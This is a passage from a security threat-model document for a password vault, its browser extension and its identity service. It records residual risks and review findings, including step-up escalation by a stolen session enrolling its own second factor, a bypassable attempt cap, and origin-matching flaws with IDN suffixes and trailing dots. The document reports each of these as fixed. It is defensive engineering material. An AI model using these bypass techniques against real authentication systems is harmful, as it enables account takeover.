  contracts consumers first — is the mitigation, and it is not enforced anywhere.
- **[ACCEPTED]** *Rotation-reuse detection can self-revoke* an extension whose service worker
  died mid-rotation. The behaviour is correct; the cost is a re-pair.
- **[ACCEPTED]** *REVOKING A PAIRED DEVICE IS NOT INSTANT DOWNSTREAM.* Identity revokes the row
  synchronously and answers 401 immediately, but every other service resolves a
  caller through `HttpSessionVerifier`, whose positive cache is keyed by
  sha256(token) with `DEFAULT_CACHE_TTL_MS` of 30 seconds (2026-07-23). So a
  revoked extension session keeps working at the vault service for up to that
  window. MEASURED in PR1's live drive rather than reasoned about: immediately
  after the revoke, identity answered 401 and the vault answered 200; 33 seconds
  later the vault answered 401.

  The cache itself is a deliberate trade and is not the problem — negatives are
  never cached, precisely so a transient identity outage cannot lock out valid
  tokens. What M16 changes is the COST of that window. Before, it meant a
  revoked browser session lingered briefly. Now the product ships a control whose
  stated purpose is "I think my extension is compromised, kill it", and the
  credential outlives the screen that says it is gone.

  Bounded rather than alarming: what survives the window is a session that
  reaches seven vault routes, five of which yield ciphertext and two of which WRITE it — the item
  reads sit behind `VaultSessionGuard`, which needs a completed SRP unlock, and
  that needs the vault password and the device Secret Key. It cannot reset a
  vault, replace a keyset, delete an item, touch emergency access, or mint
  another credential. The 30 seconds buy an attacker who already holds the token
  nothing they did not have a moment earlier.

  What was OWED is that the surface not promise more than the platform delivers.
  A revoke control that reads as instantaneous while a downstream service still
  admits the token is the M9 shape inverted — not a control reading as an
  outage, but an outage-free UI reading as a stronger control than it is.
  Shortening the TTL is the wrong fix (it trades a stated availability property
  for a cosmetic one); saying so on the screen is the right one.

  *CLOSED 2026-08-12, as copy.* `SecurityPanel` said "that takes effect
  immediately" above the list and "can no longer be used" after a revoke; both
  were false for up to one TTL. One `PROPAGATION_SENTENCE` now serves both
  sites — "signing in with it is refused straight away; other parts of the
  platform can take up to N seconds to stop accepting it" — so the confirmation
  someone reads while acting on a suspected compromise carries the same caveat
  as the paragraph they may never have read. N is DERIVED from
  `SESSION_CACHE_TTL_MS`, which `step-up.test.ts` already pins to auth-guard's
  `DEFAULT_CACHE_TTL_MS` by reading that file, so raising the TTL moves the
  sentence rather than falsifying it again. The window itself is unchanged and
  remains the deliberate trade it always was.

**Added by PR2a (the extension and its transport).**

- *The refresh token is on disk.* `chrome.storage.local` is not memory-backed, so
  a paired device keeps a refresh-capable credential for up to its 30-day life
  where local malware or another process running as the user can read it.
  `chrome.storage.session` was rejected for it: pairing is deliberately once per
  browser and repeating it needs a step-up on the APP origin, so a device that
  forgot its pairing on every browser restart would push people through that
  ceremony daily and, predictably, into not using the extension. WHAT BOUNDS IT
  IS THE AUDIENCE, not the storage — the credential reaches seven vault routes and
  three identity ones and nothing else, cannot reset a vault, replace a keyset,
  delete an item, touch emergency access, mint another handoff or enumerate the
  owner's other devices, and still decrypts nothing, because every item read sits
  behind a vault session that only a completed SRP unlock produces. It is also
  visible in the owner's paired-devices list and revocable from there in one
  click. No key material is ever written there, in PR2b or later.
- *One more unauthenticated identity route is reachable through the vault
  origin.* The edge proxies `POST /v1/auth/refresh` (and pairing redemption) as
  credential-free pass-throughs, so that the extension needs one
  `host_permission` and one origin rather than addressing identity directly. Both
  are exact-match paths carrying no bearer, neither can be READ cross-site
  because this edge sets no CORS headers and answers no preflight, and identity's
  own uniform refusals are unchanged. `POST /v1/auth/logout/refresh` remains
  deliberately unreachable.
- *The revocation window above, confirmed from the other end.* PR2a's live drive
  measured it from the extension's side rather than the owner's: after logout,
  identity refused the token at t+0 while the vault — reached through the edge on
  the same token — answered 200 at t+0 and t+10 and 401 from t+20. Same 30-second
  positive cache, same conclusion, two independent measurements.

**Added by PR2b (unlock and read).**

- *The Secret Key is remembered on disk, so two of three factors sit on one
  disk.* 2SKD derives every vault key from the vault password AND a 128-bit
  device Secret Key; the extension keeps the latter in its IndexedDB by default,
  with an explicit opt-out and copy saying what that costs. The alternative —
  retyping 26 characters at every unlock, against a 15-minute vault session that
  cannot be renewed — reliably pushes people to a text file, which is worse. But
  this artifact ALREADY holds a 30-day refresh token on disk, so local malware
  or another process running as the user now finds both, missing only the
  password; and unlike the vault ORIGIN, whose defence is an empty dependency
  tree, `script-src 'self'` and enforced Trusted Types, this is a signed artifact
  auto-updated through a vendor store with no CSP in its path (§4 TB9). WHAT IT
  STILL DOES NOT BUY IS AN OFFLINE UNLOCK: the wrapped master key, the SRP salt
  and the KDF parameters arrive from the server per unlock and are never stored,
  so opening a vault needs the password and a live handshake on a live extension
  session — which appears in the owner's paired-devices list and is revocable
  from there in one click. The Secret Key is forgotten when the device is
  disconnected.
- *The offscreen document is not a boundary against the rest of the extension,
  and must not be read as one.* `chrome.runtime.sendMessage` delivers to every
  extension context with a listener, so the vault password and Secret Key transit
  a broadcast the service worker also receives and ignores by `target`. That is
  a routing filter. All extension contexts are one signed artifact and one trust
  domain: the offscreen document buys LIFETIME (an MV3 service worker is
  terminated in seconds) and NON-EXTRACTABLE key storage, not secrecy from the
  popup. Anyone who can read that channel has already compromised the artifact
  and could ask the worker to decrypt instead. What the split does buy is
  auditability — the key holder cannot reach the network and the host cannot
  decrypt, so "can anything derived from the password leave the device" is a
  one-file question.
- *IT HAS RUN IN A BROWSER NOW, AND CI RUNS IT EVERY TIME.* This paragraph used
  to open "NOTHING HERE HAS RUN IN A BROWSER" and to explain that CI could not
  load a packed extension. The second half was wrong — `--load-extension` is
  refused by Chrome 151, but the CDP command `Extensions.loadUnpacked` is not —
  and the `browser-smoke` job in `.github/workflows/extension.yml` is what that
  correction bought. It EXTRACTS THE PACKED ARCHIVE and drives those bytes: the
  manifest is accepted by Chrome, the service worker boots,
  `chrome.offscreen.createDocument` succeeds from it, the offscreen document
  comes up, `/lib/vault-crypto/index.js` resolves at the absolute path the
  client actually loads, and a REAL SRP-6a unlock against a stand-in speaking
  the real protocol returns an unlocked vault whose item decrypts to its title.
  A wrong Secret Key is refused BY THE SERVER. Finally the central claim —
  nothing derived from the vault password or the Secret Key leaves the device —
  is asserted over bytes that crossed a real socket out of a real browser, which
  is a materially stronger statement than the same assertion against a recording
  transport in Node.
  *Still not exercised, and named rather than implied:* the FILL, because
  `activeTab` needs a genuine user invocation and a programmatic
  `chrome.action.openPopup()` grants nothing (measured); IndexedDB under the
  extension origin; and anything about the real vault SERVICE, since the
  stand-in has no sessions, audiences, step-up or guards. This is the same status the
  repository gives the Plaid live client and the Anthropic adapter — the first
  real load is a deployment event, not a test result — and it is stated here
  rather than left to be inferred from a green suite.
- *The IndexedDB premise is now MEASURED, and the brief was wrong about it.* The
  roadmap REJECTS persisting a non-extractable `CryptoKey` in extension
  IndexedDB on CEREMONY grounds — it would yield a vault permanently open with
  no password, Secret Key or TOTP, defeating 2SKD and docs/01 §5 — and
  explicitly NOT on the brief's serializability grounds, which CLAUDE.md
  recorded as a claim to measure. PR1 did not measure it; PR2b has, in a real
  Chromium: a non-extractable `CryptoKey` structured-clones successfully and the
  clone is still `extractable: false`; IndexedDB accepts it; and after a page
  navigation it comes back as a `CryptoKey`, still non-extractable, with
  `exportKey` still refusing and an AES-GCM round trip still working. So the
  brief's premise is FALSE in the direction that matters, exactly as docs/04's
  correction claimed — now demonstrated rather than asserted. THE REJECTION IS
  UNAFFECTED: it never rested on that premise, and a key that persists this well
  is precisely what makes the ceremony argument bite.
  *Still unmeasured, and handed over rather than claimed:* survival across a full
  BROWSER RESTART, and the same sequence under a real `chrome-extension://`
  origin. A scratch unpacked probe exists for both; it is deliberately not
  committed, because a key-persistence harness inside an artifact that must not
  persist keys is the wrong thing to be right about.

**Added by PR3a (origin matching).**

- *Confusable detection is partial, and §4 TB9 now says so.* Caught: punycode
  that is not the saved domain, an ASCII homoglyph skeleton fold, and
  edit-distance-1. Not caught: the general Unicode confusable case, which needs
  UTS #39 skeletons over a vendored confusables table — a named follow-up. The
  failure direction is safe: an unrecognised confusable is a `no-match`, so it is
  refused for filling and merely goes unexplained. Worth stating because the
  scope decision for this PR was taken on a claim that `rn`/`m` was covered by
  edit distance, which it is not — the homoglyph fold exists because a test
  refused to pass.
- *WRITE AND FILL ARE ONE TRUST LEVEL, and that is the sharpest consequence of
  M16 PR4a.* The item's `url` lives INSIDE the encrypted blob, and `fillFor`
  re-decides the origin from it — so anything that can write an item can repoint
  where that item's credential is later filled. The origin control is not
  bypassed; it is FED. This buys an attacker persistence rather than access
  (writing already requires an unlocked vault, and anything that can write can
  also read the credential outright), but it survives the session in which it
  was done, which reading does not. Treat "may write items" as equivalent to
  "may direct where those credentials go", and never grant one expecting the
  other to bound it.
- *An unlocked extension can overwrite every item.* The residual this used to
  state — that no restore surface exists — was written here, under a PR lead-in,
  where the residuals fence could not see it. It now sits in this section's
  declared residual region, tagged there and CLOSED by M27 PR2 (§6xx), which
  shipped the owner's restore surface; §6uu records both the move and the fence
  change that makes the next one visible. It read "tagged and owned by M27"
  until M27 PR5 — owned by the milestone that had already closed it.
- *An edit needs no read, and that was a choice rather than a limitation.* The
  popup cannot open an item: `summarise` yields titles and `fillFor` yields one
  credential for a page that matches. Editing normally requires reading the item
  back, which would have made the popup a general vault reader. Instead the key
  holder MERGES — the caller sends only the fields it is changing, and the
  plaintext it did not send is never sent back. The cost, stated on screen: a
  field left blank keeps its saved value, so clearing one is not expressible in
  the extension.
- *A stale Public Suffix List over-matches, narrowly.* The snapshot is vendored
  and digest-pinned because this package must not fetch a security parameter at
  runtime, which trades tampering-in-transit for staleness. A suffix added after
  the snapshot is unknown, so `registrableDomain` falls back to the implicit `*`
  rule and returns a SHORTER domain — which can make two hosts under a new
  multi-label registry compare equal. The staleness check is deliberately a
  one-year bound rather than a weekly one, because a check that fails constantly
  is one people learn to bump.
- *THE SAME OVER-MATCH HAPPENED FOR EVERY INTERNATIONALISED SUFFIX, and it was
  neither narrow nor hypothetical — found while scoping PR3b, fixed before it.*
  The published list writes internationalised rules as U-LABELS (`公司.cn`)
  while `URL.hostname` applies IDNA and always returns the A-LABEL
  (`a.公司.cn` → `a.xn--55qx5d.cn`). `labelsMatch` compares raw strings and
  nothing converted, so 459 of the 10,239 rules were absent from the algorithm
  entirely: the longest match fell back to the bare TLD, every registrant under
  those registries collapsed onto ONE registrable domain, and `matchOrigin`
  answered `match` for two different registrants. Measured, not reasoned about —
  `bank.公司.cn` and `shop.公司.cn` both resolved to `xn--55qx5d.cn` and
  compared equal, which is a credential offered on somebody else's site. That is
  the label-stripping failure this section calls the boundary's defining one,
  reached by a route the ASCII tests could never take, which is why every one of
  them passed over it. Rules are converted at GENERATION time now, so the
  vendored `.dat` stays byte-for-byte as published, the runtime stays a plain
  string compare, and no IDN implementation enters a package with no
  dependencies. It was latent while PR3a had no fill; PR3b is what would have
  made it exploitable.
**Added by PR5 (the security review).**

Seven file-scoped discovery lenses over the M16 range, then every candidate
confirmed by MEASUREMENT — mutation or execution against real Postgres, a real
jsdom page, or the modules run directly — before anything was changed. TENTH
milestone running where every confirmed finding sits in machinery the milestone
introduced, with one exception that is the most serious thing in the list and is
older than M16.

- **[OWNER: M29]** *AND THE FIRST FIX WAS TOO NARROW — the same escalation was still open through
  WEBAUTHN, found by verifying it.* `POST /v1/auth/webauthn/register/verify` was
  `SessionGuard`-only and `WebAuthnService` grants step-up on a successful
  assertion, so a caller holding nothing but a session could bind an
  authenticator OF THEIR OWN and elevate with it. MEASURED end to end against
  real Postgres before anything was changed: registration succeeded, and the
  attacker's session row came back `mfa_level=stepup` with a live
  `stepup_expires_at`. `excludeCredentials` looks protective and is not — it
  stops re-registering the SAME authenticator, never a different one.
  It was QUIETER than the TOTP version, which is the part worth remembering.
  That one locked the owner out (`findActiveTotp` takes the newest, so their
  codes started failing — a signal); here the victim's factors keep working, so
  nothing they can observe changes. And it also cleared the M16 step-up attempt
  cap, since WebAuthn writes `stepup.granted`.
  A PER-TYPE PREDICATE LEFT A HOLE IN BOTH DIRECTIONS: `hasVerifiedTotp` is
  false for an account holding only a passkey, so the TOTP-only fix would still
  have admitted a session-only caller enrolling TOTP on a passkey-protected
  account. **Closed** by `SecondFactorGate`, one predicate over both stores —
  "does this account hold ANY factor it could be made to prove" — called from
  `enrollTotp` and from BOTH ends of the WebAuthn registration ceremony (the
  options end so a refusal comes before the hardware ceremony, the verify end
  because that is the write). The bootstrap residual is unchanged and still
  stated: a first factor cannot be gated, so an account with none is still
  reachable by a stolen session.
- *THE GATE IS INVISIBLE TO EVERY OTHER FENCE, WHICH IS WHY IT HAS ITS OWN.*
  The condition is account state, so the gate cannot be a `StepUpGuard`
  decorator — and every fence in this repo that checks step-up gating scans for
  that decorator. That is precisely how the WebAuthn route sat ungated while its
  TOTP twin was being fixed one file away.
  `apps/services/identity/test/factor-routes.spec.ts` closes it, and it
  discovers by WHAT THE CODE DOES rather than by a remembered list: it scans for
  calls to the repo methods that WRITE factor state, resolving the receiver from
  its TYPE annotation rather than its field name, so a new enrolment path is
  found by the write it has to make whatever it is called. Mutation-tested four
  ways — a deleted gate, a brand-new undeclared method that binds a credential
  (discovered and named), a renamed repo field (correctly still green, because
  the anchor is the type), and a revert to the TOTP-only predicate. It found a
  genuine error in its own declaration table on its first run, and a name
  collision on its second (`EmailVerificationRepo` also has a `markVerified`),
  which is what drove the type anchoring.
- **[OWNER: M29]** *THE WORST FINDING IS PRE-EXISTING AND M16 IS WHAT MADE IT MATTER: a stolen
  session could ENROL ITS OWN SECOND FACTOR.* `POST /v1/auth/totp/enroll` had
  been `SessionGuard`-only since M2. `revokeUnverifiedTotp` spares a VERIFIED
  method while `findActiveTotp` takes the NEWEST one, so a caller holding
  nothing but a session could enrol a secret of their own, confirm it with a
  code they computed themselves, and step up — three ordinary requests, no
  guessing. Measured end to end against real Postgres, including the second
  half: the owner's own authenticator answered 401 afterwards, so it was a
  takeover AND a lockout, of every docs/01 §5 action and of §5.1's liveness
  proof. The repository had already seen the mechanism and read it as a
  test-seeding nuisance (CLAUDE.md 2026-08-06, on why the settlement e2e caches
  enrolment). M16 is what made it acute: it built an attempt cap whose entire
  premise is that step-up bounds a stolen credential, and widened `stepup` to
  two more audiences. **Closed** by gating enrolment on a fresh step-up WHEN A
  VERIFIED FACTOR ALREADY EXISTS. *Residual, and it cannot be closed here:* for
  an account that never enrolled a factor, a stolen session still buys the
  bootstrap — there is no proof to demand. Such an account had no second factor
  to defeat. **The second half of this residual is CLOSED by M17 PR2**: it used
  to read "and identity cannot warn the owner because M14 deliberately made it
  not a holder of the notifications SEND credential", which was true when
  written and is now false in the direction that matters. Identity holds an
  ACCOUNT-SECURITY send edge of its own (`NOTIFICATIONS_SECURITY_INTERNAL_TOKEN`,
  §6l) and still holds no estate-send credential, so it can tell an owner their
  credentials changed without gaining the power to ring "a death report was
  filed on your account". What remains unwarned is the enrolment bootstrap
  itself — that kind does not exist yet, and adding one is a decision about
  which account events are worth a mail rather than a capability question. *Second residual,
  recorded not fixed:* a legitimate re-enrolment silently retires the previous
  authenticator, because `findActiveTotp` takes the newest. "Add a device" and
  "replace a device" are different intentions and the platform offers one
  behaviour for both; it is behind step-up now, so only the owner can cause it.

- *THE ATTEMPT CAP WAS BYPASSABLE BY ONE ROUTE.* `POST /v1/auth/totp/verify`
  checks the SAME `mfa_methods` row and had no cap of any kind, and its failures
  are a kind the counter did not count. Measured: forty wrong codes, forty 401s,
  never a 429, counter still zero — after which the code the guessing found
  elevated at `stepup` on the first try, spending none of the five.
  `stepup.ts`'s own "one chokepoint covers both" was wrong by one route.
  **Closed** — the failure and success kinds are SETS, both routes pass one
  gate, and `test/rate-bounds.spec.ts` scans the service so a third
  checker of the secret arrives declared or turns red.

- *THE CAP WAS A RENEWABLE LOCKOUT AGAINST THE OWNER, which its own docstring
  claimed a rolling window avoided.* The count was keyed on the USER and every
  live session wrote into it, so five wrong codes from ONE credential — the
  30-day extension token on disk being the cheapest — refused every OTHER
  session of the account. Measured: the owner's untouched session got 429 where
  it should have got 401. The only thing that clears the window is a success,
  which is what the 429 prevents, so five denials each quarter-hour hold it
  there indefinitely: the sticky lock the file says it refused to build,
  re-armed on a timer, blocking vault open, document generation, export,
  beneficiary changes, deletion and §5.1's rescue path. **Closed** with two
  scopes — a per-session cap a stolen credential exhausts on itself, under an
  account-wide ceiling that stays the real bound on guessing. *Residual:* an
  attacker who can MINT sessions (i.e. holds the password) can still walk the
  account total to its ceiling. That is the bar the account cap exists for.

- *ONE IDN PAGE DISCLOSED THE WHOLE VAULT.* See §4 TB9 above; **closed**, and
  the page-level notice replaces the per-item claim.

- *A DOUBLED TRAILING DOT COLLAPSED TWO REGISTRANTS ONTO A BARE SUFFIX.*
  `normaliseHost` stripped ONE trailing dot and was called twice on different
  strings, so `publicSuffix`'s empty-label guard never fired: `bank.com..` and
  `evil.com..` both resolved to `com.` and `matchOrigin` answered `match`.
  `URL.hostname` preserves the doubled dot, so the input is reachable, though
  both sides must carry it. **Closed** by making normalisation idempotent — a
  function called twice must agree with itself.

- *KEY MATERIAL SURVIVED A FAILED UNLOCK.* `prepare()` runs before the second
  SRP leg, so a refused or malformed `srp/verify` returned with the AUK and the
  SRP private key still resident — and because the idle clock is armed only on
  SUCCESS, nothing was scheduled to collect them. Only an offscreen teardown
  would ever have taken them. **Closed**: every non-success exit drops them.

- *A REVOKED PAIRING KEPT THE SECRET KEY ON DISK.* `forgetSecretKey` had two
  callers — the explicit opt-out and the VOLUNTARY disconnect. The path an owner
  takes when they revoke a device they believe is compromised forgot the session
  and left half the key material behind, so the protective route was the weaker
  of the two. **Closed.**

- *SMALLER, ALL CLOSED:* a refused injection rendered as "no password field was
  found on this page", collapsing a control into an absence on the one signal
  that says the platform refused; the vault edge's credential precedence fell
  through to the cookie on a MALFORMED `Authorization` header, so "never looks
  at the cookie" held only for well-formed input; and two shipped docstrings
  still said the extension credential "reaches five vault routes" four PRs after
  PR4a made it seven.

- *THE ROUTE-AUDIENCE FENCE WAS NAME-KEYED.* It scanned source for the literal
  `@AllowSessionAudiences`, while both guards resolve `SESSION_AUDIENCE_METADATA`
  through `Reflector.getAllAndOverride` — so an aliased import or a raw
  `SetMetadata` widens a route and is matched by nothing. Only `vault` and
  `identity` have a second-layer spec reading real handler metadata; for the
  other seven services that scan is the whole enforcement. This is the shape the
  credential graph was fixed for twice (2026-07-28, 2026-08-07). **Closed** by
  additionally asserting the metadata key has exactly one route into it,
  mutation-tested with a real alias.

- *STATED, NOT FIXED — WHAT THIS REVIEW DID NOT DO.* Nothing in the review ran
  in a real browser: the extension's own claims rest on jsdom and the crypto on
  Node's WebCrypto. One of the two things it recorded as owed has since been
  MEASURED; the rest stands.

- *`activeTab` REVOCATION, MEASURED — Chrome 151.0.7922.110, macOS.* The review
  left this open, noting that the fill-time re-read makes the boundary hold
  either way but that the platform's actual behaviour was unmeasured here. It
  is measured now, with a scratch probe extension holding `activeTab` and
  `scripting` and NO host permissions, so the grant was the only thing in play.
  The grant was taken with a real OS-level keyboard invocation of the action —
  a programmatic `chrome.action.openPopup()` from the service worker opens the
  popup and does NOT grant, which the run's control caught before any result was
  believed.

  | navigation from `a.test:8899` | grant |
  | --- | --- |
  | same origin (`a.test:8899/three`) | **survives** — still injects |
  | different host (`b.test:8899`) | **revoked** |
  | same host, different port (`a.test:8900`) | **revoked** |
  | subdomain, same site (`sub.a.test:8899`) | **revoked** |

  So the grant is ORIGIN-scoped and any cross-origin navigation revokes it. Two
  consequences worth keeping. First, the pre-fix TOCTOU really was being held
  shut by the platform rather than by the extension's own logic, exactly as the
  review suspected — which is why re-reading the tab at the gesture was the
  right fix regardless: it makes the code's stated claim true instead of resting
  on undocumented behaviour nobody here had checked. Second, THE PLATFORM IS
  STRICTER THAN OUR OWN MATCHER: `matchOrigin` treats a subdomain as the same
  registrable domain and would fill there, while the grant does not survive the
  navigation to it. Nothing depends on that asymmetry, but it means a same-site
  redirect loses the grant, which is a refusal a user may see and which is
  correct.

  *Bounded, and stated as such:* one Chrome build, one platform, a probe
  extension rather than the shipped artifact, and a keyboard invocation rather
  than a toolbar click. Both are user invocations; if the two ever diverge, this
  measured the keyboard one.

- *`activeTab` discloses the active tab's URL to the extension.* That is the
  minimum origin matching can run on, and it is bounded by the permission itself:
  granted only when the user clicks the extension, revoked on navigation, and
  carrying no ability to run code (that is `scripting`, still absent). There is
  no standing view of browsing, and no history.

## 6k. Threat-model delta — M17 PR1, the abuse bounds (2026-08-12)

**Before this change the platform had exactly one rate limit, on the second
factor, and it was the only one in the product.** `POST /v1/auth/login` accepted
password guesses at whatever rate a caller could sustain, each costing one
Argon2id verification; `POST /v1/auth/register` accepted registrations at 64 MiB
of memory-hard work apiece, paid before it looked to see whether the address
existed. `recordLoginFailure` wrote a `login.failed` row on every failure and
**nothing has ever read one**. Four residuals in this document (§6a, §6b, §6g,
§6i) deferred to "identity's login rate limiting" as a standing follow-up. This
is that follow-up, for login and register only. **A third bound was added by
the M17 PR6 review** — `POST /v1/auth/password` verifies the current password
and this delta's own framing ("the routes that take a password from an
unauthenticated caller") is exactly why it was missed; see §6p.

**Two bounds, because one selector cannot see the whole surface.**

| | keyed on | where it lives | what it sees |
|---|---|---|---|
| account | `user_id` | `auth_events`, the M16 predicate | guessing against an account that EXISTS |
| address | email blind index | **in memory, per process** | everything else — unknown addresses, register probes |

The account half is blind to most of what needs bounding, and structurally so:
`recordLoginFailure(null, …)` writes a NULL user whenever the identifier does not
resolve, and register's duplicate path returns having written no row in either
direction. So an attacker spraying one password across many addresses, and every
register probe, produce nothing a user-keyed predicate can count. The
address-keyed half is therefore the PRIMARY bound and the account half is the
durable ceiling behind it.

**The blind index is deliberately NOT added to `auth_events`.** That table is
append-only (`REVOKE UPDATE, DELETE`) and carries no `dek_id`, so an
`email_bidx` column there would permanently and unshreddably record a
correlatable identifier for addresses belonging to NO ACCOUNT — people who never
registered, typed at a login box by somebody else, with no erasure path. It
would also invert M9's "no blind index, lookup by user id only" decision for the
delivery store, and the index it needs is a plain `CREATE INDEX` inside the
migrator's BEGIN/COMMIT, which `005_auth_events_index.sql` already records as
taking a SHARE lock that blocks INSERT on the authentication write path.

**LOGIN REFUSES WITH THE SAME 401 A WRONG PASSWORD GETS.** This is the
load-bearing decision. A 429 on login is an account-existence oracle however the
counter is keyed, because it is a state a caller reaches only by naming
something the platform counted: past the threshold a live address would answer
429 while an address with no account answers 401 forever. That is perfectly
reliable, timing-independent, and would defeat the `dummyVerify` equalization
`password.ts` calls mandatory — the control manufacturing the oracle it was
added to bound. Register does answer 429, and that is safe for the mirror-image
reason: its bound is keyed on the submitted address alone and counted whether or
not an account exists, so the refusal depends on nothing the caller does not
already know.

**Ordering is a control, not arrangement.** The address check runs BEFORE the
user lookup — safe because its answer is existence-independent, and it is the
only thing standing between an unauthenticated caller and Argon2id. The account
check runs AFTER the password verification, which looks wasteful and is the only
correct placement: checking it earlier would let an over-cap account answer fast
while an unknown address still paid a full hash, which is the timing oracle this
route burns a dummy verification to close. Both orderings are pinned by
`test/rate-bounds.spec.ts`, because both produce a working rate limiter and only
one closes the channel.

### Residuals, stated rather than implied

- **[OWNER: E1]** *The account bound has NO per-credential scope, so a sustained attack denies
  NEW logins for that account.* M16's escape from the renewable-lockout trap was
  a per-session scope; login has no credential at the point of failure, and no
  restructuring invents one. Anyone who knows an address can submit wrong
  passwords for it and hold the account at its ceiling for as long as they keep
  it up. **What bounds the harm is that the bound touches the login route only:**
  a session that already exists keeps working, keeps refreshing, and reaches
  every route in the product, because `findLiveByAccessHash` and
  `findLiveByRefreshHash` consult no counter. That is not the M16 situation,
  where the refusal blocked the one action that could clear the window and
  simultaneously blocked vault open, document generation, export, beneficiary
  changes, deletion and §5.1's liveness proof. Twenty per fifteen minutes is set
  so no legitimate user meets it, which makes reaching it a burst signal rather
  than a support ticket. Proven, not asserted:
  `test/login-bound.int.spec.ts` drives an attacker to the ceiling and shows the
  owner's live session and refresh token still resolving.
- **[OWNER: E1]** *The address bound is per PROCESS and evadable three ways.* It survives no
  restart, is not shared between replicas (so the effective limit is N × the cap
  across N of them), and its map is capacity-bounded, which means a caller can
  evict their own counter by spraying unrelated addresses until it turns over.
  Eviction fails OPEN deliberately: failing closed would let whoever fills the map
  deny logins to every user in the product, which is worse than the spraying it
  would be trying to stop. The account half is the durable ceiling precisely
  because this half is evadable.
- **[OWNER: E1]** *PER-IP LIMITING IS NOT SHIPPED AND §4 TB1 IS CORRECTED RATHER THAN SATISFIED.*
  That section has claimed "per-IP+per-account rate limits" as an existing
  control since the document was written. There is no client IP anywhere in
  identity — no `X-Forwarded-For` read, no `req.ip`, and `sessions.ip_ct` /
  `auth_events.ip_ct` are declared and written by nothing — and neither public
  edge forwards one. Per-IP limiting belongs at the WAF, which is blocked on the
  M5 cloud half (an AWS org and billing, not an engineering decision). §4 now
  marks the per-IP half as unbuilt instead of asserting it.
- **[OWNER: M26]** *`login.failed` rows remain unattributed on the unknown-address path.* The
  append-only ledger is evidence about accounts that exist, and is not — and
  cannot be — the counter for the rest. Pinned as a known property by an int
  case rather than left to be rediscovered.
- **[OWNER: M29]** *Registration's enumeration channel is a TIMING one and a bound does not close
  it.* The duplicate path returns early having done less work; the fix its own
  docstring names is a fixed-shape, fixed-time response, which is a separate
  change. What the bound closes is the cost, not the leak.
- **[OWNER: E1]** *The other unauthenticated routes are deliberately unbounded.* `POST
  /v1/auth/handoff/redeem` and `POST /v1/auth/extension/pairing/redeem` check a
  guessable secret with no attempt cap by construction — a wrong guess resolves
  no row, so there is nothing to attribute a count to, which is the shape M14's
  round-2 review found making a cap decorative. Their bound remains 160 bits of
  entropy, a short TTL and burn-on-attempt. `POST /v1/auth/refresh` and `POST
  /v1/auth/logout/refresh` are likewise unbounded; both resolve a 256-bit token
  or nothing.
- **[CLOSED: §6y]** *The authenticated routes that check a secret were NOT considered here, and
  one of them needed a bound.* This delta's list above enumerates only
  UNAUTHENTICATED routes, which is how `POST /v1/auth/password` — whose whole
  purpose is to defend against a stolen session — went unbounded until the PR6
  review measured it (§6p). The list is now: login, register, password change
  AND the address-change request are bounded — the last two share one
  `ACCOUNT_PASSWORD_BOUND`, because two budgets of five are a budget of ten to
  anyone willing to alternate (§6y); handoff/pairing redeem and the two refresh
  routes are deliberately not.
- **[OWNER: E1]** *The bounds are per-service-instance for the address half and per-account for
  the ledger half; neither is a global quota.* §4 TB1's "per-tenant load
  shedding" is unrelated infrastructure work and is not delivered here.

### What M17 PR1 closes that predates it

- **[OWNER: M39]** *§6a's SRP rate-limiting residual — still only in part, and NOT by this change.*
  M16 closed the step-up half transitively. Login now has its own bound, which is
  what §6a's sentence pointed at, but a caller holding a genuine step-up can
  still burn vault SRP handshakes. That half stays open and is tracked in §6a.
  RE-OWNED FROM M27 BY M27 PR0; §6a's bullet again, tagged a third time.
- *§6i's "no rate limiting on handoff minting" is UNCHANGED.* Minting is
  step-up gated and therefore already sits behind the M16 cap; the standing
  follow-up it named was login's, which is now delivered, so its cross-reference
  is corrected rather than its residual closed.
- **[OWNER: E1]** *§6g's redeem-route residual is UNCHANGED and is edge work.* A per-caller
  bound there needs a caller identity this platform does not have; the 160-bit
  code is the control.

## 6l. Threat-model delta — M17 PR2, the password change (2026-08-12)

**Identity has never had a route that changes a password.** Sixteen milestones of
authentication with no way to rotate the credential all of it rests on, and no
deferral written anywhere — every "password reset" string in these documents
refers to the VAULT password (Zone A, M6), which is a different credential under
a different key hierarchy.

**The gate is BOTH halves, and each covers what the other cannot.**

| presented | what it proves | what a thief lacking it cannot do |
|---|---|---|
| current password | knowledge of the secret being replaced | a stolen SESSION cannot lock the owner out |
| fresh step-up (where a factor exists) | possession of the account's factor | a stolen PASSWORD cannot be made permanent |

The step-up half is **conditional**, on `SecondFactorGate`'s existing predicate:
an account with no verified factor has nothing to prove, and an unconditional
gate would make its password unchangeable forever — the worst available answer
for exactly the users least protected. The step-up question is asked BEFORE the
password check, so the route is not a free password oracle and the refusal's
timing does not vary with whether the guess was right.

**THE OLD HASH IS NO LONGER KEPT** (identity migration 008). `users_versions`
captures a row image on every `users` UPDATE, and this is the first UPDATE
`password_hash` has ever had, so before this change every password change would
have written its predecessor's Argon2id verifier into a table this schema
REVOKEs UPDATE and DELETE on. The M6 vault precedent does **not** transfer as
stated — an old hash verifies a RETIRED password, not the current secret, and
nothing in the repo reads `users_versions` — but that comment's *justification*
does: it keeps full row images everywhere else because "the ciphertext in it is
readable with the same key as the live row", i.e. crypto-shredding reaches the
capture. `password_hash` is the ONE column in `users` for which that is false. A
row image that survives a crypto-shred must not contain a credential verifier.
`email_ct` and `dek_id` are deliberately kept: they *are* under the envelope, and
they carry the audit value the trigger exists for.

**Ordering is the control, again.** `CREATE OR REPLACE FUNCTION` only affects
future captures, so a redaction shipped one release after the first write leaves
verifiers nothing can retract. The migration and the route are the same commit.

**Identity gained a transaction and an actor.** It was the only service of the
nine with no `withTransaction` and no `set_config('app.actor_id')` — measured,
every row that trigger has written came back with a NULL actor. Both halves
matter here: the hash write and the session revocation commit together (a hash
without the revocation leaves every credential minted under the old password
live), and the capture now records who. Redaction is only defensible because
what survives is who and when.

**A password change revokes every OTHER session, and keeps the caller's.** That
session has just proved the current password and, where one exists, a fresh
factor — it is the one credential in the set demonstrably held by someone who
knows the secret being replaced. Signing the changer out too is defensible and
is rejected on the M6 rule: a password change that ends your session teaches
people not to change their password.

**A FIFTH NOTIFICATIONS EDGE** (`NOTIFICATIONS_SECURITY_INTERNAL_TOKEN`, holder
identity alone). A silent password change is unacceptable and undoing M14's
split is worse. Three options existed, not two:

- *add identity to the estate SEND edge* — **impossible as a narrow grant**:
  `SendSchema` is built per-ROUTE from `ESTATE_NOTIFICATION_KINDS`, so there is
  no mechanism anywhere to give one holder a subset. Identity would get all ten,
  including `settlement.case_opened` and every `emergency.*`.
